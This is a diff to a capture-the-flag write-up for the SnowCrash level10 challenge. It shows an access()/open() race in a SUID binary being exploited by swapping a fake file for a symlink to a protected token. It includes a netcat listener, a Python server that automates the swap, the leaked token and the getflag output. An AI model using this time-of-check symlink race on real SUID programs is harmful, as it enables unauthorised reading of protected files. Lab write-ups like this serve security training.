@@ -12,52 +12,9 @@ We debug the binary with gdb and reverse engineer it
 We notice it reads the file passed from the first argument and sends it to the IP passed from the second argument over
 port 6969
 
-We create a simple python server that read requests using socket:
+We setup a simple server with netcat listening on port 6969:
 
-```python
-import socket
-
-def handle_client(client_socket):
-    """Handle communication with the client."""
-    try:
-        data = ""
-
-        # Continuously receive data from the client until the connection is closed
-        while True:
-            chunk = client_socket.recv(1024)  # Read 1024 bytes at a time
-            if not chunk:
-                break  # No more data (connection closed)
-            data += chunk  # Accumulate the data
-
-        if data:
-            print "Received data:"
-            print data  # Print the full received data
-        else:
-            print "Received no data or connection closed."
-
-        # Send a simple acknowledgment back to the client
-        client_socket.sendall(b"200 OK\n")
-    except Exception as e:
-        print "Error:", e
-    finally:
-        # Close the client connection
-        client_socket.close()
-
-def start_server(host='0.0.0.0', port=6969):
-    """Start the TCP server and accept incoming connections."""
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.bind((host, port))
-    server_socket.listen(5)
-    print "Server listening on %s:%d..." % (host, port)
-
-    while True:
-        client_socket, client_address = server_socket.accept()
-        print "Connection established with", client_address
-        handle_client(client_socket)
-
-if __name__ == "__main__":
-    start_server()
-```
+nc -l 6969
 
 We test with various payloads:
 
@@ -70,9 +27,9 @@ Sending file .. wrote file!
 
 It seems we can read only files that level10 has access to
 
-Running a strings command over the binary we realize that the binary is using `authorize` sys call before opening the file. The error string message "You don't have access to %" is also present
+Running a strings command over the binary we realize that the binary is using `access` sys call before opening the file. The error string message "You don't have access to %" is also present
 
-We find running `strace` over the binary that the error message is being fired due to the authorize funtion returning -1 (Permission denied)
+We find running `strace` over the binary that the error message is being fired due to the access function returning -1 (Permission denied)
 
 strace ./level10 token 127.0.0.1
 ...
@@ -101,11 +58,11 @@ open("/etc/passwd", O_RDONLY)           = 4
 
 
 Since the binary, `level10`, has SUID rights `open` syscall will inherit those permissions when running the binary and could read the target file token.
-So the `authorize` syscall is the one stopping us.
+So the `access` syscall is the one stopping us.
 
-We realize that we could trick `authorize` by passing a fake file created by us and swapping it with a symlink to the target before open is called.
+We realize that we could trick `access` by passing a fake file created by us and swapping it with a symlink to the target before open is called.
 
-We modify our python script which will run a server on port 6969, creating an swapping the fake files:
+We modify our python script which will run a server on port 6969, creating and swapping the fake files:
 
 ```python
 import socket
@@ -143,7 +100,7 @@ def main():
             create_fake_sym_link()
 	    print("Fake symlink created.")
             client_socket, client_address = server.accept()
-            print("Client conected:", client_address)
+            print("Client connected:", client_address)
             data = ""
             while True:
                 buff = client_socket.recv(1024)
@@ -158,16 +115,27 @@ if __name__ == "__main__":
 
 Since the client binary starts opening the file as soon as the TCP handshake is finished, we'll sometimes receive the content of the fake file. So it's a matter of multiple executions until the race condition is met and the symlink gets created before the binary tries to open it:
 
+In one terminal we run the server:
 python /tmp/server.py
 
 Listening on 6969...
-Incoming connection requested!
-Fake symlink created.
-('Client conected:', ('127.0.0.1', 44972))
-('Received:', '.*( )*.\nThis is a fake file.')
 
-Incoming connection requested!
+And in another terminal we run the client:
+/level10 /tmp/token 127.0.0.1
+
+Connecting to 127.0.0.1:6969 .. Incoming connection requested!
 Fake symlink created.
-('Client conected:', ('127.0.0.1', 44973))
+('Client connected:', ('127.0.0.1', 55194))
+Connected!
+Sending file .. wrote file!
 ('Received:', '.*( )*.\nwoupa2yuojeeaaed06riuj63c\n')
 
+We can see that the file was written and the content of the token file was sent to the server: woupa2yuojeeaaed06riuj63c
+
+We login as flag10 and launch getflag:
+
+level10@SnowCrash:~$ su flag10
+Password:
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
